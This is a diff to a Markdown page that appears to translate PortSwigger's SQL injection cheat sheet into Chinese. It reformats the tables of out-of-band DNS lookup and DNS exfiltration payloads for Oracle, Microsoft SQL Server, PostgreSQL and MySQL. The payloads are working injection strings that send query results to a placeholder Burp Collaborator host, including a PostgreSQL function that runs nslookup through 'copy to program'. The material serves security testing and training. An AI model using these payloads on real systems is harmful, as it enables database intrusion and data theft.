@@ -117,19 +117,64 @@ description: '原文链接：https://portswigger.net/web-security/sql-injection/
 | :--- | :--- |
 | Oracle | The following technique leverages an XML external entity \([XXE](https://portswigger.net/web-security/xxe)\) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence: `SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual`  The following technique works on fully patched Oracle installations, but requires elevated privileges: `SELECT UTL_INADDR.get_host_address('YOUR-SUBDOMAIN-HERE.burpcollaborator.net')` |
 | Microsoft | `exec master..xp_dirtree '//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a'` |
-| PostgreSQL | copy \(SELECT ''\) to program 'nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net' |
+| PostgreSQL | `copy (SELECT '') to program 'nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net'` |
 | MySQL | The following techniques work on Windows only: `LOAD_FILE('\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a')` `SELECT ... INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'` |
 
 ### 带数据渗出的DNS查找
 
 您可以使数据库对包含注入查询结果的外部域进行 DNS 查询。要做到这一点，您需要使用 [Burp Collaborator 客户端](https://portswigger.net/burp/documentation/desktop/tools/collaborator-client)生成一个您将在攻击中使用的唯一 Burp Collaborator 子域，然后轮询 Collaborator 服务器以检索任何 DNS 交互的细节，包括被渗出的数据。
 
-| DataBases | Statements |
-| :--- | :--- |
-| Oracle | SELECT extractvalue\(xmltype\('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root \[ &lt;!ENTITY % remote SYSTEM "http://'\|\|\(SELECT YOUR-QUERY-HERE\)\|\|'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"&gt; %remote;\]&gt;'\),'/l'\) FROM dual |
-| Microsoft | declare @p varchar\(1024\);set @p=\(SELECT YOUR-QUERY-HERE\);exec\('master..xp\_dirtree "//'+@p+'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a"'\) |
-| PostgreSQL |  |
-| MySQL | The following technique works on Windows only: `SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'` |
+<table>
+  <thead>
+    <tr>
+      <th style="text-align:left">DataBases</th>
+      <th style="text-align:left">Statements</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align:left">Oracle</td>
+      <td style="text-align:left"><code>SELECT extractvalue(xmltype(&apos;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://&apos;||(SELECT YOUR-QUERY-HERE)||&apos;.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/&quot;&gt; %remote;]&gt;&apos;),&apos;/l&apos;) FROM dual</code>
+      </td>
+    </tr>
+    <tr>
+      <td style="text-align:left">Microsoft</td>
+      <td style="text-align:left"><code>declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec(&apos;master..xp_dirtree &quot;//&apos;+@p+&apos;.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a&quot;&apos;)</code>
+      </td>
+    </tr>
+    <tr>
+      <td style="text-align:left">PostgreSQL</td>
+      <td style="text-align:left">
+        <p><code>create OR replace function f() returns void as $$</code>
+        </p>
+        <p><code>declare c text; </code>
+        </p>
+        <p><code>declare p text; </code>
+        </p>
+        <p><code>begin </code>
+        </p>
+        <p><code>SELECT into p (SELECT YOUR-QUERY-HERE); </code>
+        </p>
+        <p><code>c := &apos;copy (SELECT &apos;&apos;&apos;&apos;) to program &apos;&apos;nslookup &apos;||p||&apos;.YOUR-SUBDOMAIN-HERE.burpcollaborator.net&apos;&apos;&apos;; </code>
+        </p>
+        <p><code>execute c; </code>
+        </p>
+        <p><code>END;</code>
+        </p>
+        <p><code>$$  language plpgsql security definer; </code>
+        </p>
+        <p><code>SELECT f();</code>
+        </p>
+      </td>
+    </tr>
+    <tr>
+      <td style="text-align:left">MySQL</td>
+      <td style="text-align:left">The following technique works on Windows only:
+        <br /><code>SELECT YOUR-QUERY-HERE INTO OUTFILE &apos;\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a&apos;</code>
+      </td>
+    </tr>
+  </tbody>
+</table>
 
 
 
